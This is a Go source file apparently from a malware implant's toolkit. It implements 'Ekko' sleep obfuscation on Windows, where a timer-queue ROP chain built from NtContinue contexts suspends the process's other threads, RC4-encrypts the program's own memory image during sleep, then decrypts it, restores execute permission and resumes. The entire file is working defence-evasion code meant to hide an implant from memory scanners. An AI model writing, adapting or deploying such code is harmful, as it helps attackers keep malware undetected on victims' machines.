package ekko

import (
	"crypto/rand"
	"log"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9

	// Just what we need: suspend/resume + query for the start-address check.
	threadAccess = windows.THREAD_SUSPEND_RESUME | windows.THREAD_QUERY_INFORMATION | windows.THREAD_GET_CONTEXT

	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
	// the kernel to actually commit the suspension before we touch memory.
	contextControlAMD64 = 0x00100001
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
	procSignalObjectAndWait   = kernel32dll.NewProc("SignalObjectAndWait")
	procNtResumeProcess       = ntdll.NewProc("NtResumeProcess")
	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")

	//ntdll
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

func EkkoSleep(sleepTime uint64) error {

	// Pin the goroutine to the current OS thread for the entire duration of
	// the sleep. Without this, the Go scheduler can migrate the goroutine to
	// a different M between iterations of the suspend loop, causing
	// GetCurrentThreadId() to return a stale TID and — on the next iteration
	// — we call SuspendThread on the very thread we are currently running on.
	// That is exactly the hang scenario we saw in Process Hacker: one thread
	// suspended, stack frozen inside NtSuspendThread, inside EkkoSleep.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	currentProcessID := uint32(windows.GetCurrentProcessId())
	currentTID := windows.GetCurrentThreadId()

	// Take a snapshot of all running threads in the system
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	var peers []windows.Handle

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
	ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)

	for {
		if te32.OwnerProcessID == currentProcessID && te32.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
			if openErr == nil {
				var dwStartAddress, size uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					ThreadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&dwStartAddress)),
					unsafe.Sizeof(dwStartAddress),
					uintptr(unsafe.Pointer(&size)),
				)

				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
					peers = append(peers, hThread) // stays open; the chain suspends it
				} else {
					windows.CloseHandle(hThread)
				}
			}
		}

		// ALWAYS advance — never `continue` without advancing, or we infinite-loop.
		if err = windows.Thread32Next(hThreadSnapshot, &te32); err != nil {
			break // No more threads
		}
	}

	ekkoErr := ekko(sleepTime, peers)
	for _, h := range peers {
		windows.CloseHandle(h)
	}
	return ekkoErr
}

func ekko(sleepTime uint64, peers []windows.Handle) error {

	var CtxThread CONTEXT
	var RopProtRW CONTEXT
	var RopMemEnc CONTEXT
	var RopDelay CONTEXT
	var RopMemDec CONTEXT
	var RopProtRX CONTEXT
	var RopSetEvt CONTEXT

	var keybuf [16]byte
        rand.Read(keybuf[:])

	var Key, Img UString

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()

	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)

	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	RopProtRW = CtxThread
	RopMemEnc = CtxThread
	RopDelay = CtxThread
	RopMemDec = CtxThread
	RopProtRX = CtxThread
	RopSetEvt = CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = windows.PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
	RopDelay.Rcx = uint64(windows.CurrentProcess())
	RopDelay.Rdx = sleepTime

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent.Addr())
	RopSetEvt.Rcx = uint64(hEvent)


	const gapMs = 100 // spacing between phases; steps inside one phase may run in any order

	hReady, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	n := len(peers)
	buf := make([]CONTEXT, 2*n+9) // 2n+8 steps + 1 scratch; size isn't constant, so it's on the heap
	scratch := &buf[len(buf)-1]   // GetThreadContext's output: we want the sync, not the data
	scratch.ContextFlags = contextControlAMD64

	i := 0
	queue := func(c CONTEXT, phase int) {
		buf[i] = c
		procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(),
			uintptr(unsafe.Pointer(&buf[i])), uintptr(phase*gapMs), 0, WT_EXECUTEINTIMERTHREAD)
		i++
	}

	queue(step(&CtxThread, procWaitForSingleObject.Addr(), uint64(hReady), uint64(windows.INFINITE)), 1) // gate
	for _, h := range peers {
		queue(step(&CtxThread, procSuspendThread.Addr(), uint64(h)), 2)
	}
	for _, h := range peers {
		queue(step(&CtxThread, procGetThreadContext.Addr(), uint64(h), uint64(uintptr(unsafe.Pointer(scratch)))), 3)
	}
	queue(RopProtRW, 4)
	queue(RopMemEnc, 5)
	queue(RopDelay, 6)
	queue(RopMemDec, 7)
	queue(RopProtRX, 8)
	queue(step(&CtxThread, procNtResumeProcess.Addr(), uint64(windows.CurrentProcess())), 9)
	queue(RopSetEvt, 10)

	// Signal the gate and start waiting in one kernel call: once the chain runs, G1 has no Go code left.
	procSignalObjectAndWait.Call(hReady, hEvent, uintptr(windows.INFINITE), 0)
	runtime.KeepAlive(buf) // the timer thread reads buf through raw addresses the GC can't see

	procDeleteTimerQueue.Call(hTimerQueue)
	windows.CloseHandle(windows.Handle(hReady))
	windows.CloseHandle(windows.Handle(hEvent))
	return nil
}


// step returns a copy of base that calls fn(args...) and then returns into the timer dispatcher.
func step(base *CONTEXT, fn uintptr, args ...uint64) CONTEXT {
	c := *base
	c.Rsp -= 8
	c.Rip = uint64(fn)
	for i, r := range []*uint64{&c.Rcx, &c.Rdx, &c.R8, &c.R9}[:len(args)] {
		*r = args[i]
	}
	return c
}
